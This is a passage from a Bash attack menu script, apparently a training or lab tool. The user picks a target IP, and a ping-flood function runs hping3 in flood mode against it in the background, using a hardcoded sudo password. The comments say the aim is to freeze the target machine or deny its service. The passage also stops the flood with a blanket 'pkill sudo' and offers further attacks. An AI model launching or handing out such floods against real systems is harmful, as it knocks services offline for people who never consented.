		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_PING
	fi

	}
	CHOOSEIP_PING
	
	##Ping Flood attacking
	function PINGFLOOD()
	{
	echo "Press 'k' to stop ping flood"
	sleep 3
	#hping3 is used to flood the target in attempt to freeze the machine or deny its service
	echo kali | sudo -S hping3 -1 --flood $(cat temp_shuffleip) &
	#Press 'k' to stop brute forcing & deletes created temporary file
		function KILLPROC_PINGF()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing PING FLOOD.."
	#'pkill' kills the background process (hping3) that was previously pushed into background
				pkill sudo
	#removes temporary file created
				rm -rf temp_shuffleip
				sleep 3
				echo -e "Completed."
				return
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process			
			else
			echo "INVALID KEY. Press 'k' to stop"
			KILLPROC_PINGF
			fi
		}
		KILLPROC_PINGF
		return

	}
	PINGFLOOD
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "Do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans
	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	esac

else
echo -e "\nInvalid option \nExiting.. "
rm -rf temp_ipatklist
rm -rf temp_Nmap
exit

fi

atkmcq
}
atkmcq
